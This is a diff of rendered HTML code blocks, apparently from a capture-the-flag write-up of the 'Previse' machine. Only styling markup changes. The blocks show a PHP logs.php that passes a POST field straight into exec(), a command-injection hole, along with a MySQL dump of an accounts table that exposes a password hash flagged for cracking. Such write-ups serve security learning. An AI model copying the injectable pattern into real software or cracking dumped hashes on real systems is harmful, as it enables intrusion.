-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>cat logs<span style="color:#ff79c6">.</span>php
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
-</span></span><span style="display:flex;"><span>session_start();
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>isset(<span style="color:#8be9fd;font-style:italic">$_SESSION</span>[<span style="color:#f1fa8c">&#39;user&#39;</span>])) {
-</span></span><span style="display:flex;"><span>    header(<span style="color:#f1fa8c">&#39;Location: login.php&#39;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">exit</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;?php
-</span></span><span style="display:flex;"><span>if (!$_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;) {
-</span></span><span style="display:flex;"><span>    header(&#39;Location: login.php&#39;);
-</span></span><span style="display:flex;"><span>    exit;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/////////////////////////////////////////////////////////////////////////////////////
-</span></span><span style="display:flex;"><span>//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
-</span></span><span style="display:flex;"><span>/////////////////////////////////////////////////////////////////////////////////////
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$output = exec(&#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[&#39;delim&#39;]}&#34;);
-</span></span><span style="display:flex;"><span>echo $output;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$filepath = &#34;/var/www/out.log&#34;;
-</span></span><span style="display:flex;"><span>$filename = &#34;out.log&#34;;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>if(file_exists($filepath)) {
-</span></span><span style="display:flex;"><span>    header(&#39;Content-Description: File Transfer&#39;);
-</span></span><span style="display:flex;"><span>    header(&#39;Content-Type: application/octet-stream&#39;);
-</span></span><span style="display:flex;"><span>    header(&#39;Content-Disposition: attachment; filename=&#34;&#39;.basename($filepath).&#39;&#34;&#39;);
-</span></span><span style="display:flex;"><span>    header(&#39;Expires: 0&#39;);
-</span></span><span style="display:flex;"><span>    header(&#39;Cache-Control: must-revalidate&#39;);
-</span></span><span style="display:flex;"><span>    header(&#39;Pragma: public&#39;);
-</span></span><span style="display:flex;"><span>    header(&#39;Content-Length: &#39; . filesize($filepath));
-</span></span><span style="display:flex;"><span>    ob_clean(); // Discard data in the output buffer
-</span></span><span style="display:flex;"><span>    flush(); // Flush system headers
-</span></span><span style="display:flex;"><span>    readfile($filepath);
-</span></span><span style="display:flex;"><span>    die();
-</span></span><span style="display:flex;"><span>} else {
-</span></span><span style="display:flex;"><span>    http_response_code(404);
-</span></span><span style="display:flex;"><span>    die();
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>?&gt;
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">cat logs<span style="color:#ff79c6">.</span>php
+<span style="color:#ff79c6">&lt;?</span>php
+session_start();
+<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>isset(<span style="color:#8be9fd;font-style:italic">$_SESSION</span>[<span style="color:#f1fa8c">&#39;user&#39;</span>])) {
+    header(<span style="color:#f1fa8c">&#39;Location: login.php&#39;</span>);
+    <span style="color:#ff79c6">exit</span>;
+}
+<span style="color:#ff79c6">?&gt;</span>
+
+&lt;?php
+if (!$_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;) {
+    header(&#39;Location: login.php&#39;);
+    exit;
+}
+
+/////////////////////////////////////////////////////////////////////////////////////
+//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
+/////////////////////////////////////////////////////////////////////////////////////
+
+$output = exec(&#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[&#39;delim&#39;]}&#34;);
+echo $output;
+
+$filepath = &#34;/var/www/out.log&#34;;
+$filename = &#34;out.log&#34;;
+
+if(file_exists($filepath)) {
+    header(&#39;Content-Description: File Transfer&#39;);
+    header(&#39;Content-Type: application/octet-stream&#39;);
+    header(&#39;Content-Disposition: attachment; filename=&#34;&#39;.basename($filepath).&#39;&#34;&#39;);
+    header(&#39;Expires: 0&#39;);
+    header(&#39;Cache-Control: must-revalidate&#39;);
+    header(&#39;Pragma: public&#39;);
+    header(&#39;Content-Length: &#39; . filesize($filepath));
+    ob_clean(); // Discard data in the output buffer
+    flush(); // Flush system headers
+    readfile($filepath);
+    die();
+} else {
+    http_response_code(404);
+    die();
+}
+?&gt;
+</code></pre></td></tr></table>
 </div>
 </div><p>On BURP, I url encode this payload:</p>
 <table>
@@ -567,67 +567,67 @@ mysql&gt;
 </code></pre>
 <h3 id="explore-the-database">Explore the database</h3>
 <p>We obtain the m4lwhere user password hash that we can crack with john or hashcat:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">show</span> tables;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#6272a4">-------------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> Tables_in_previse <span style="color:#ff79c6">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#6272a4">-------------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> accounts          <span style="color:#ff79c6">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span> files             <span style="color:#ff79c6">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#6272a4">-------------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
-</span></span><span style="display:flex;"><span>mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">describe</span> accounts;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#6272a4">------------+--------------+------+-----+-------------------+----------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> Field      <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Type</span>         <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Null</span> <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Key</span> <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Default</span>           <span style="color:#ff79c6">|</span> Extra          <span style="color:#ff79c6">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#6272a4">------------+--------------+------+-----+-------------------+----------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> id         <span style="color:#ff79c6">|</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#bd93f9">11</span>)      <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NO</span>   <span style="color:#ff79c6">|</span> PRI <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NULL</span>              <span style="color:#ff79c6">|</span> auto_increment <span style="color:#ff79c6">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span> username   <span style="color:#ff79c6">|</span> <span style="color:#8be9fd;font-style:italic">varchar</span>(<span style="color:#bd93f9">50</span>)  <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NO</span>   <span style="color:#ff79c6">|</span> UNI <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NULL</span>              <span style="color:#ff79c6">|</span>                <span style="color:#ff79c6">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span> password   <span style="color:#ff79c6">|</span> <span style="color:#8be9fd;font-style:italic">varchar</span>(<span style="color:#bd93f9">255</span>) <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NO</span>   <span style="color:#ff79c6">|</span>     <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NULL</span>              <span style="color:#ff79c6">|</span>                <span style="color:#ff79c6">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span> created_at <span style="color:#ff79c6">|</span> datetime     <span style="color:#ff79c6">|</span> YES  <span style="color:#ff79c6">|</span>     <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">CURRENT_TIMESTAMP</span> <span style="color:#ff79c6">|</span>                <span style="color:#ff79c6">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#6272a4">------------+--------------+------+-----+-------------------+----------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
-</span></span><span style="display:flex;"><span>mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> id, username, password <span style="color:#ff79c6">from</span> accounts;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#6272a4">----+--------------+------------------------------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> id <span style="color:#ff79c6">|</span> username     <span style="color:#ff79c6">|</span> password                           <span style="color:#ff79c6">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#6272a4">----+--------------+------------------------------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">|</span> m4lwhere     <span style="color:#ff79c6">|</span> $<span style="color:#bd93f9">1</span>$_llol$DQpmdvnb7EeuO6UaqRItf. <span style="color:#ff79c6">|</span>
-</span></span><span style="display:flex;"><span>[..]
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#6272a4">----+--------------+------------------------------------+
-</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">show</span> tables;
+
+<span style="color:#ff79c6">+</span><span style="color:#6272a4">-------------------+
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> Tables_in_previse <span style="color:#ff79c6">|</span>
+<span style="color:#ff79c6">+</span><span style="color:#6272a4">-------------------+
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> accounts          <span style="color:#ff79c6">|</span>
+<span style="color:#ff79c6">|</span> files             <span style="color:#ff79c6">|</span>
+<span style="color:#ff79c6">+</span><span style="color:#6272a4">-------------------+
+</span><span style="color:#6272a4"></span>
+mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">describe</span> accounts;
+
+<span style="color:#ff79c6">+</span><span style="color:#6272a4">------------+--------------+------+-----+-------------------+----------------+
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> Field      <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Type</span>         <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Null</span> <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Key</span> <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Default</span>           <span style="color:#ff79c6">|</span> Extra          <span style="color:#ff79c6">|</span>
+<span style="color:#ff79c6">+</span><span style="color:#6272a4">------------+--------------+------+-----+-------------------+----------------+
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> id         <span style="color:#ff79c6">|</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#bd93f9">11</span>)      <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NO</span>   <span style="color:#ff79c6">|</span> PRI <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NULL</span>              <span style="color:#ff79c6">|</span> auto_increment <span style="color:#ff79c6">|</span>
+<span style="color:#ff79c6">|</span> username   <span style="color:#ff79c6">|</span> <span style="color:#8be9fd;font-style:italic">varchar</span>(<span style="color:#bd93f9">50</span>)  <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NO</span>   <span style="color:#ff79c6">|</span> UNI <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NULL</span>              <span style="color:#ff79c6">|</span>                <span style="color:#ff79c6">|</span>
+<span style="color:#ff79c6">|</span> password   <span style="color:#ff79c6">|</span> <span style="color:#8be9fd;font-style:italic">varchar</span>(<span style="color:#bd93f9">255</span>) <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NO</span>   <span style="color:#ff79c6">|</span>     <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NULL</span>              <span style="color:#ff79c6">|</span>                <span style="color:#ff79c6">|</span>
+<span style="color:#ff79c6">|</span> created_at <span style="color:#ff79c6">|</span> datetime     <span style="color:#ff79c6">|</span> YES  <span style="color:#ff79c6">|</span>     <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">CURRENT_TIMESTAMP</span> <span style="color:#ff79c6">|</span>                <span style="color:#ff79c6">|</span>
+<span style="color:#ff79c6">+</span><span style="color:#6272a4">------------+--------------+------+-----+-------------------+----------------+
+</span><span style="color:#6272a4"></span>
+mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> id, username, password <span style="color:#ff79c6">from</span> accounts;
+
+<span style="color:#ff79c6">+</span><span style="color:#6272a4">----+--------------+------------------------------------+
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> id <span style="color:#ff79c6">|</span> username     <span style="color:#ff79c6">|</span> password                           <span style="color:#ff79c6">|</span>
+<span style="color:#ff79c6">+</span><span style="color:#6272a4">----+--------------+------------------------------------+
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">|</span> m4lwhere     <span style="color:#ff79c6">|</span> $<span style="color:#bd93f9">1</span>$_llol$DQpmdvnb7EeuO6UaqRItf. <span style="color:#ff79c6">|</span>
+[..]
+<span style="color:#ff79c6">+</span><span style="color:#6272a4">----+--------------+------------------------------------+
